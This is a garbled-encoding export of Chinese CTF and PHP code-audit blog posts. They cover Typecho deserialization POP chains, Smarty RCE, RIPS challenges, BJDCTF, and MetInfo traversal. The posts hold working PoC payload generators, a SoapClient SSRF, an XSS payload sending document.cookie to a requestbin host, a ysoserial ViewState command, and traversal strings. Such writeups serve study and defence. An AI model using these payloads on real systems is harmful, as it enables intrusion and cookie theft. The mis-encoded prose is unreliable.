è¿™ç±»blogç±»å‹çš„æ¡†æ¶çš„æ¼æ´å¾ˆå¤šå‡ºç°åœ¨æ’ä»¶æˆ–ä¸»é¢˜ä¸­ï¼Œè¿™é‡Œçœ‹äº†ä¸‹ç›®å½•ç»“æ„ï¼Œæ‰¾åˆ°äº†å…¥å£ ç®€å•åˆ†ævar/Typecho/Plugin.php æ¿€æ´»æ’ä»¶æ–¹æ³•å¤„å¾—åˆ°ç»‘å®šçš„url usr/plugins/HelloWorld/Plugin.php ååºåˆ—åŒ–è§¦å‘ç‚¹ ååºåˆ—åŒ–å…¥å£ç±» è·Ÿè¿› ç¬¬ä¸€å¤„å­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘__toString() ç¬¬äºŒå¤„å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä»¥åŠè§¦å‘__call() æ—¢ç„¶èƒ½è§¦å‘__toString()ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªæ€è·¯å°±å¼€å§‹äº†ï¼Œå…¶å®å°±æ˜¯è¿œå¤çš„é‚£æ¡POPé“¾ï¼ŒåŸç†ä¸åœ¨èµ˜è¿°ã€‚ ç¬¬äºŒä¸ªæ€è·¯åº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œå°±æ˜¯åˆ©ç”¨SSRFå¸¦ä¸ªsessionidï¼Œå†æ¬¡è®¿é—®ä¼švar_dump() æ€è·¯ä¸€å†å²æ¼æ´çš„POPé“¾ var/Typecho/Feed.php-&gt;__toString()-&gt;$item[&#39;author&#39;]-&gt;screenName var/Typecho/Request.php-&gt;__get()-&gt;get()-&gt;_applyFilter-&gt;call_user_func() POCç¼–å†™ 1234567891011121314151617181920212223242526272829&lt;?phpclass Typecho_Request&#123; private $_params = []; private $filter = []; function __construct()&#123; $this-&gt;_params = ['screenName'=&gt;'1']; $this-&gt;filter = ['phpinfo']; &#125;&#125;class Typecho_Feed&#123; private $_items = []; private $_type; const RSS2 = 'RSS 2.0'; function __construct()&#123; $this-&gt;_items = ['author'=&gt;new Typecho_Request,'category'=&gt;[new Typecho_Request]];//æ³¨æ„ç‚¹ $this-&gt;_type = self::RSS2; &#125;&#125;class HelloWorld_DB&#123; private $coincidence = []; function __construct()&#123; $this-&gt;coincidence = ['hello'=&gt;new Typecho_Feed,'world'=&gt;'gqy']; &#125;&#125;echo base64_encode(serialize(new HelloWorld_DB)); è¿™é‡Œçš„categoryæ˜¯ä¸ºäº†è®©ç¨‹åºæŠ¥é”™ï¼Œä»è€Œç¨‹åºå¼ºåˆ¶åœæ­¢ï¼Œé‚£ä¹ˆç¼“å†²åŒºçš„æ•°æ®ä¼šè¾“å‡ºå‡ºæ¥ã€‚å½“æ—¶æœ‰ä¸ªob_start()ä½†æ˜¯è¿™é‡Œæ²¡æœ‰ob_start()ï¼Œå°è¯•å…¶ä»–çš„åŠæ³•ä¹Ÿæ— æœï¼Œåº”è¯¥æ˜¯æ–°ç‰ˆæœ¬ä¿®å¤äº†æ¼æ´ï¼Œå¦‚ä½•ä¿®å¤çš„æ²¡æœ‰ç»§ç»­æ·±ç©¶ã€‚ Fatal error: Method Typecho_Feed::__toString() must not throw an exception, caught Error: Cannot use object of type Typecho_Request as array PS:é‚£ä¸ªè¿‡æ»¤æ˜¯ä¸æ˜¯0day x) æ€è·¯äºŒvar/Typecho/Db/Query.php è¿™é‡Œæ˜æ˜¾å¯ä»¥è§¦å‘__call()ï¼Œé…åˆSoapClientè¿›è¡ŒSSRF POCç¼–å†™ 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; // $target = 'http://118.178.88.46:1234'; $target = 'http://127.0.0.1/flag.php'; $post_string = 'gqy=1'. \"\\r\\n\"; $headers = array( 'Cookie: PHPSESSID=glotozz', // 'X-Forwarded-For: 127.0.0.1' ); $b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; \"aaab\")); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); $aaa = str_replace('&amp;','&amp;',$aaa); $c = unserialize($aaa); // $c-&gt;notexist(); // var_dump($c); $this-&gt;_adapter = $c; $this-&gt;_sqlPreBuild = ['action'=&gt;'SELECT']; &#125;&#125;class HelloWorld_DB&#123; private $coincidence = []; function __construct()&#123; $this-&gt;coincidence = ['hello'=&gt;new Typecho_Db_Query,'world'=&gt;'gqy']; &#125;&#125;echo base64_encode(serialize(new HelloWorld_DB)); ä¿®æ”¹Cookieï¼ŒPHPSESSIDè®¾ç½®æˆglotozzå†æ¬¡è®¿é—®","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Smarty<=3.1.31 RCE","slug":"Smarty-3-1-31-RCE","date":"2020-03-26T03:21:11.000Z","updated":"2020-03-26T07:50:20.043Z","comments":true,"path":"2020/03/26/Smarty-3-1-31-RCE/","link":"","permalink":"https://glotozz.github.io/2020/03/26/Smarty-3-1-31-RCE/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ¼æ´å¤ç° æ€»ç»“ å‚è€ƒé“¾æ¥ ç¯å¢ƒæ­å»º https://www.smarty.net/ æ¼æ´å½±å“Smarty&lt;=3.1.31ã€3.1.32-dev éœ€è¦æ§åˆ¶æ–‡ä»¶åå˜é‡ æ¼æ´åˆ†æä¿®æ”¹ä¸‹index.php 123456789101112131415161718192021222324252627282930&lt;?php/** * Example Application * * @package Example-application */define('SMARTY_ROOT_DIR', str_replace('\\\\', '/', __DIR__));define('SMARTY_COMPILE_DIR', SMARTY_ROOT_DIR.'/tmp/templates_c');define('SMARTY_CACHE_DIR', SMARTY_ROOT_DIR.'/tmp/cache');require '../libs/Smarty.class.php';class testSmarty extends Smarty_Resource_Custom&#123; protected function fetch($name, &amp;$source, &amp;$mtime) &#123; $template = \"CVE-2017-1000480 smarty PHP code injection\"; $source = $template; $mtime = time(); &#125;&#125;$smarty = new Smarty();$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);$smarty-&gt;registerResource('test', new testSmarty);$smarty-&gt;display('test:'.$_GET['eval']);?&gt; è·Ÿè¿›display() è·Ÿè¿›_execute() 1$result &#x3D; $template-&gt;render(false, $function); ä¸»è¦æ˜¯åˆ›å»ºæ¨¡ç‰ˆå¹¶è¿›å…¥æ¸²æŸ“å‡½æ•° è·Ÿè¿›render() ä¹‹å‰æ²¡æœ‰ç”Ÿæˆæ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶ï¼Œè¿™é‡Œä¼šç»§ç»­è¿›å…¥render() è·Ÿè¿›process() å…ˆè·Ÿè¿›compileTemplateSource() è·Ÿè¿›compileTemplate() è·Ÿè¿›create() å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‹¼æ¥ä¸Šäº†filepathï¼Œè¿™é‡Œå‰åæœ‰/*å’Œ*/ï¼Œå¯ä»¥*/phpinfo();/*ç»•è¿‡ ä½†æ˜¯æˆ‘ä»¬è¿˜è¦è§£å†³è®¿é—®ç¼“å­˜æ–‡ä»¶ï¼Œ è·Ÿè¿›ä¹‹å‰çš„loadCompiledTemplate() å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå› æ­¤ä¹‹å‰çš„ç¼“å­˜æ–‡ä»¶è¢«åŒ…å«äº† æ¼æ´å¤ç° åœ¨winå¹³å°ä¸‹ï¼Œæ–‡ä»¶åä¸­ä¸å…è®¸æœ‰*ï¼Œè€Œsmartyæ¡†æ¶çš„ç”Ÿæˆçš„ç¼–è¯‘æ–‡ä»¶çš„åå­—ä¼šå«æœ‰æˆ‘ä»¬çš„payloadï¼Œæ‰€ä»¥åœ¨winä¸‹æ—¶ä¼šç›´æ¥æç¤ºåˆ›å»ºæ–‡ä»¶å¤±è´¥ã€‚ æ€»ç»“ç”¨æˆ·æ§åˆ¶å‚æ•°å†™å…¥æ¨¡ç‰ˆæ–‡ä»¶ä¹Ÿæ˜¯å®¹æ˜“å‡ºç°æ¼æ´çš„åœ°æ–¹ã€‚ å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/1983 https://www.cnblogs.com/magic-zero/p/8351974.html","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"RIPS 2017 PHPä»£ç å®‰å…¨å®¡è®¡æŒ‘æˆ˜wp","slug":"RIPS-2017-PHPä»£ç å®‰å…¨å®¡è®¡æŒ‘æˆ˜wp","date":"2020-03-26T00:53:57.000Z","updated":"2020-03-26T06:36:51.628Z","comments":true,"path":"2020/03/26/RIPS-2017-PHPä»£ç å®‰å…¨å®¡è®¡æŒ‘æˆ˜wp/","link":"","permalink":"https://glotozz.github.io/2020/03/26/RIPS-2017-PHP%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8C%91%E6%88%98wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Day 1 - Wish List Day 2 - Twig Day 3 - Snow Flake Day 4 - False Beard Day 6 - Frost Pattern Day 7 - Bells Day 8 - Candle Day 10 - Anticipation Day 11 - Pumpkin Pie Day 12 - String Lights Day 13 - Turkey Baster Day 14 - Snowman Day 15 - Sleigh Ride Day 16 - Poem Day 17 - Mistletoe Day 18 - Sign Day 19 - Birch Day 21 - Gift Wrap Day 23 - Cookies å‚è€ƒé“¾æ¥ è™½ç„¶æ˜¯2017å¹´çš„ï¼Œä½†æ˜¯å†…å®¹è¿˜æ˜¯å¾ˆæœ‰æ„ä¹‰çš„ã€‚è¿™é‡ŒæŒ‘å‡ ä¸ªè®°å½•ä¸€ä¸‹ Day 1 - Wish List123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = './solutions/'; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file['tmp'], self::UPLOAD_DIRECTORY . $this-&gt;file['name'] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES['solution']); æ¼æ´ç‚¹åœ¨in_array()å‡½æ•°ï¼Œ 1bool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] ) é»˜è®¤ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯FALSEï¼Œ å¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º TRUEï¼Œåˆ™in_array()å‡½æ•°æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚ è¿™é‡Œçš„ç™½åå•ä¸ºæ•°å­—ï¼Œå› æ­¤phpåœ¨åˆ¤æ–­æ—¶ä¼šå°†$this-&gt;file[&#39;name&#39;]è‡ªåŠ¨è½¬æ¢ä¸ºæ•´æ•°ï¼Œå› æ­¤å¯ä»¥5gqy.phpç»•è¿‡ Day 2 - Twig123456789101112131415161718192021222324252627282930313233// composer require \"twig/twig\"require 'vendor/autoload.php';class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = '&lt;img ' . 'src=\"https://loremflickr.com/320/240\"&gt;' . '&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide Â»&lt;/a&gt;'; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\\Loader\\ArrayLoader([ 'index.html' =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET['nextSlide']; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( 'index.html', ['link' =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); filter_var($nextSlide, FILTER_VALIDATE_URL); åªæ˜¯å½¢å¼ä¸Šçš„æ£€æŸ¥a://bï¼Œå› æ­¤å¯ä»¥javascript:// Twigçš„ 1&#123;&#123;link|escape&#125;&#125; å’ŒPHPä¸­çš„htmlspecialchars($link, ENT_QUOTES, &#39;UTF-8&#39;)ç±»ä¼¼ï¼Œæ‰€ä»¥å•å¼•å·å’ŒåŒå¼•å·ç­‰éƒ½æ— æ³•ä½¿ç”¨ã€‚ åœ¨javascriptä¸­//è¡¨ç¤ºæ³¨é‡Šï¼Œå¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦ç»•è¿‡%0aï¼Œç”±äºå…ˆç»è¿‡phpå†è¿›å…¥æ¨¡ç‰ˆï¼Œ%éœ€è¦è½¬ä¹‰ï¼Œ Payloadä¸ºjavascript://%250a Day 3 - Snow Flake1234567891011121314151617181920212223242526272829function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET['c'];$data = $_GET['d'];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo 'There is no page with this name';&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data['new']) &#123; echo 'controller rendering new response'; &#125; else &#123; echo 'controller rendering old response'; &#125; &#125;&#125; ä¸»è¦å°±æ˜¯__autoload() å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» ä»PHP 7.2.0 å¼€å§‹ï¼Œæ­¤åŠŸèƒ½å·²è¢« å¼ƒç”¨ã€‚å¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½ã€‚ è¿™é‡Œçš„class_exists()ä¼šè§¦å‘__autoload()ï¼Œæœ¬é¢˜ä¸­å¯ä»¥ä»»æ„æ–‡ä»¶åŒ…å« è¿˜æœ‰å¦ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯å®ä¾‹åŒ–ä¸€ä¸ªå†…ç½®ç±»ï¼Œ SimpleXMLElementç±»æ¥å®ŒæˆXXEæ”»å‡» Day 4 - False Beard1234567891011121314151617181920class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, '&lt;') || !strpos($user, '&gt;')) &amp;&amp; (!strpos($pass, '&lt;') || !strpos($pass, '&gt;')) ) &#123; $format = '&lt;xml&gt;&lt;user=\"%s\"/&gt;&lt;pass=\"%s\"/&gt;&lt;/xml&gt;'; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST['username'], $_POST['password']); æœ¬æ„æ˜¯ç¦æ­¢å‡ºç°&lt;å’Œ&gt; 12var_dump(strpos(&#39;abcd&#39;,&#39;a&#39;)); # 0var_dump(strpos(&#39;abcd&#39;,&#39;x&#39;)); # false ç”±äºphpè‡ªåŠ¨ç±»å‹è½¬æ¢0==falseï¼Œå› æ­¤åªè¦ç¬¬ä¸€ä½æ˜¯&lt;å³å¯ç»•è¿‡åˆ¤æ–­ Day 6 - Frost Pattern123456789101112131415161718192021222324252627class TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case 'create': $this-&gt;createToken($data); break; case 'delete': $this-&gt;clearToken($data); break; default: throw new Exception('Unknown action'); &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents('/tmp/tokens/' . $token, '...data'); &#125; public function clearToken($token) &#123; $file = preg_replace(\"/[^a-z.-_]/\", \"\", $token); unlink('/tmp/tokens/' . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET['action'], $_GET['data']); æœ¬æ„æ˜¯ï¼Œæ˜¯å°†éa-z . - _ å…¨éƒ¨æ›¿æ¢ä¸ºç©º æœ¬é¢˜çš„é—®é¢˜åœ¨äº[^a-z.-_]ä¸­çš„-æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œè¡¨ç¤ºçš„æ˜¯éa-z .-_ Day 7 - Bellsparse_str()çš„å‚æ•°å¯æ§å¯¼è‡´å˜é‡è¦†ç›– Day 8 - Candlepreg_replace(&#39;/e&#39;,&#39;&#39;)å¯¼è‡´ä»£ç æ‰§è¡Œ Day 10 - Anticipationheader()è¿›è¡Œè·³è½¬ä»£ç ç»§ç»­æ‰§è¡Œ Day 11 - Pumpkin PiePHPä¸­çš„ååºåˆ—åŒ–çš„ä¸€ä¸ªBUGï¼Œåªéœ€è¦åœ¨å¯¹è±¡é•¿åº¦å‰æ·»åŠ ä¸€ä¸ª+å·ï¼Œå³o:14-&gt;o:+14ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚ Day 12 - String Lights$sanitized[$key] = intval($value); åªå¯¹$valueè¿›è¡Œäº†è¿‡æ»¤ Day 13 - Turkey Baster123456789function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input;&#125;$test = \"1234567890123456789'\";var_dump(sanitizeInput($test)); åˆ©ç”¨é•¿åº¦æˆªæ–­å°†addslashes()æ·»åŠ çš„\\é€ƒé€¸å‡ºæ¥ï¼Œè½¬ä¹‰åŸæœ¬é—­åˆçš„å•å¼•å· ç±»ä¼¼çš„è¿˜æœ‰ä¸€ç§æ˜¯æ’å…¥admin+50ä¸ª0+1ï¼Œç”±äºæˆªæ–­æ’å…¥admin+50ä¸ª0ï¼Œåœ¨where name=&#39;admin&#39;çš„æ—¶å€™æˆåŠŸç™»å½•admin Day 14 - Snowman12echo $test++; //æ— æ•ˆæœecho ++$test; //éšå¼ç±»å‹è½¬æ¢+æœ€åä¸€ä¸ªå­—ç¬¦åŠ æ³•æ“ä½œ var_export(get_object_vars($this), true)ä¸ä¼šè¿›è¡Œè½¬ä¹‰ Day 15 - Sleigh Rideå­˜åœ¨$url = urldecode($url);ï¼ŒäºŒæ¬¡ç¼–ç ç»•è¿‡ Day 16 - Poemä»$_REQUESTå˜é‡ç›´æ¥å¼•ç”¨ï¼Œå¯èƒ½ä¼šå¿˜è®°è¿‡æ»¤ï¼Œè®°å¾—æœ‰ä¸ªå†å²æ¼æ´å°±æ˜¯åˆ©ç”¨è¿™ä¸ªã€‚ è¿˜æœ‰å°±æ˜¯&#39;1a&#39;==1 Day 17 - Mistletoe12var_dump(md5('1')); # c4ca4238a0b923820dcc509a6f75849bvar_dump(md5('1',True)); # ï¿½ï¿½B8ï¿½ï¿½#ï¿½ï¿½Pï¿½ouï¿½ï¿½ Day 18 - Signopenssl_verify() Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error å¦‚æœåˆ¤æ–­ä¸æ˜¯if(openssl_verify()===1)ï¼Œå°±æœ‰å¯èƒ½åˆ©ç”¨-1ç»•è¿‡ if()åªæœ‰é‡åˆ°0æˆ–è€…falseæ‰è¿”å›false Day 19 - Birch stripcslasheså‡½æ•° è¿”å›åè½¬ä¹‰åçš„å­—ç¬¦ä¸²ã€‚å¯è¯†åˆ«ç±»ä¼¼ C è¯­è¨€çš„ \\nï¼Œ\\rï¼Œâ€¦ å…«è¿›åˆ¶ä»¥åŠåå…­è¿›åˆ¶çš„æè¿°ã€‚ å› æ­¤å¯ä»¥åˆ©ç”¨8è¿›åˆ¶ç»•è¿‡ Day 21 - Gift Wrap array_walk()çš„ä¸€ä¸ªbugã€‚phpæ˜¯ä¸€ä¸ªå¼±ç±»å‹çš„è¯­è¨€ï¼Œåœ¨ä¼ å…¥å‚æ•°æ—¶å¹¶ä¸ä¼šè¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œç”šè‡³æœ‰æ—¶å€™è¿˜ä¼šè¿›è¡Œéšå¼ç±»å‹è½¬æ¢ åœ¨php7ä¸­å°±å¼•å…¥äº†declare(strict_types=1); é€šè¿‡array_walk()è°ƒç”¨çš„å‡½æ•°ä¼šå¿½ç•¥æ‰ä¸¥æ ¼æ¨¡å¼è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„phpçš„ç±»å‹è½¬æ¢çš„æ–¹å¼è°ƒç”¨å‡½æ•° Day 23 - Cookiesldap_escape($user, null, LDAP_ESCAPE_DN) The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs è¿™é‡Œé€‰ç”¨äº†é”™è¯¯çš„è¿‡æ»¤æ–¹å¼ å‚è€ƒé“¾æ¥ https://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/#M-tbRemYKdmb5mr4dRCndhHCM5YaFRaRf8","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"BJDCTF2nd-wp","slug":"BJDCTF2nd-wp","date":"2020-03-25T12:38:54.000Z","updated":"2020-03-26T03:18:34.877Z","comments":true,"path":"2020/03/25/BJDCTF2nd-wp/","link":"","permalink":"https://glotozz.github.io/2020/03/25/BJDCTF2nd-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• XSSä¹‹å…‰ EasyAspDotNet å‚è€ƒé“¾æ¥ é€‰äº†ä¸¤é¢˜è¡¥ä¸€è¡¥ XSSä¹‹å…‰ gitæ³„éœ²ï¼ŒGitHackè¿˜åŸ åªæœ‰ä¸€ä¸ªindex.php 123&lt;?php$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];echo unserialize($a); phpåŸç”Ÿç±»ååºåˆ—åŒ–ï¼Œå½“å‰phpç‰ˆæœ¬ä¸ºphp5.6.40 å¯ä»¥åˆ©ç”¨çš„ä¸»è¦æœ‰è¿™äº› __call() SoapClientç±»ï¼Œå¯ä»¥è§¦å‘SSRF wupcoå¸ˆå‚…çš„pocä¸¾ä¾‹ 1234567891011&lt;?php$target = \"http://example.com:5555/\";$post_string = 'data=abc';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa); __toString() Errorç±»ï¼Œé€‚ç”¨äºphp7 Exceptionç±»ï¼Œé€‚ç”¨äºphp5ï¼Œphp7 é€šå¸¸ç”¨æˆ·è§¦å‘XSS 123456789&lt;?phperror_reporting(0);$a = new Exception(\"&lt;script&gt;alert()&lt;/script&gt;\");$b = serialize($a);echo urlencode($b);//Test$c = urldecode('O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D');echo unserialize($c); è¿™é¢˜ä½¿ç”¨Exceptionç±»æ¥è§¦å‘XSSï¼Œåˆ©ç”¨window.location.hrefæˆ–è€…window.openï¼Œæ³¨æ„ä¸èƒ½ç”¨bpï¼Œè¿™æ—¶æµè§ˆå™¨çš„åŠŸèƒ½ 1234&lt;?php $a &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;\\&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?cookie&#x3D;\\&quot;+escape(document[\\&quot;cookie\\&quot;])&lt;&#x2F;script&gt;&quot;); $a &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;); $b &#x3D; serialize($a); ============é¢˜å¤–è¯ï¼Œä¹Ÿæ˜¯æ‘˜è‡ªé“¾æ¥ å¦‚æœèƒ½å®ä¾‹åŒ–ä»»ä½•ç±»ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›åŸç”Ÿç±»ï¼Œè™½ç„¶è¿˜æ²¡é‡åˆ°è¿‡è¿™ä¸ªåœºæ™¯ å¯è·å–ç›®å½•DirectoryIterator XXESimpleXMLElement åˆ›å»ºç©ºç™½æ–‡ä»¶SQLite3 EasyAspDotNetASP.NETè¿˜æ˜¯ç¬¬ä¸€æ¬¡åšï¼Œä¸»è¦æ˜¯å¤ç°ä¸‹ï¼ŒåŸç†æœ‰ç¼˜å†çœ‹ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œ.aspx åç¼€ï¼Œè¯»å–web.config æœ‰äº† VIEWSTATE çš„åŠ å¯†å¯†é’¥ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–æ”»å‡» 1ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;System.dll;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey&#x3D;&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; 12dir c:\\type c:\\Fl@g_glzjin_still_w@nts_a_girl_friend.txt å‚è€ƒé“¾æ¥ https://www.gem-love.com/ctf/2097.html https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html https://www.zhaoj.in/read-6497.html https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"MetInfoä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„ä¿®å¤ä¸ç»•è¿‡","slug":"MetInfoä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„ä¿®å¤ä¸ç»•è¿‡","date":"2020-03-25T08:03:17.000Z","updated":"2020-03-31T12:50:29.333Z","comments":true,"path":"2020/03/25/MetInfoä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„ä¿®å¤ä¸ç»•è¿‡/","link":"","permalink":"https://glotozz.github.io/2020/03/25/MetInfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• æ¼æ´åˆ†æ æ¼æ´å¤ç° æ€»ç»“ å‚è€ƒé“¾æ¥ è™½ç„¶è¿™ä¸ªæ¼æ´ä¸å¤æ‚ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«çš„æ¼æ´ä¿®å¤ä¸ç»•è¿‡æŒºæœ‰æ„æ€ æ¼æ´åˆ†æå®˜ç½‘ä¸‹è½½äº†ä¸€ä¸ªV6.0.0 app/system/include/module/old_thumb.class.php è¿™é‡Œçœ‹åˆ°çš„å·²ç»æ˜¯æœ€ç»ˆç‰ˆæœ¬äº†ï¼Œå°†../å’Œ./æ›¿æ¢ä¸ºç©ºï¼Œå¹¶ä¸”ä¸èƒ½æœ‰./ï¼Œä¸”éœ€è¦åŒ…å«http åœ¨windowsä¸‹ä»ç„¶èƒ½åˆ©ç”¨ ?dir=http\\..\\..\\config\\config_db.php æœ€åˆçš„ä¸¤ä¸ªç‰ˆæœ¬æ˜¯æ›¿æ¢../ä¸ºç©ºï¼Œåˆ©ç”¨....//å³å¯ç»•è¿‡ æ›¿æ¢../å’Œ./ä¸ºç©ºï¼Œåˆ©ç”¨...././/å³å¯ç»•è¿‡ æ–‡ç« å¤ªçŸ­äº†ï¼Œè·Ÿä¸€ä¸‹metinfoçš„è°ƒç”¨ include/thumb.php app/system/entrance.php app/system/include/class/load.class.php åŒ…å«äº†app/system/include/module/old_thumb.class.php æ¼æ´å¤ç°/MetInfo6.0.0/include/thumb.php?dir=http\\..\\..\\config\\config_db.php æ€»ç»“æ¼æ´è·Ÿè¸ªä¹Ÿæ˜¯æŒ–æ˜æ¼æ´çš„ä¸€ç§æ–¹å¼ï¼Œå°¤å…¶æ˜¯è‡ªå·±æäº¤çš„ï¼ŒæŸç§æ„ä¹‰ä¸ŠæŒ–æ˜èµ·æ¥æ›´ç®€å•ã€‚ å‚è€ƒé“¾æ¥ https://www.freebuf.com/vuls/181698.html","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç 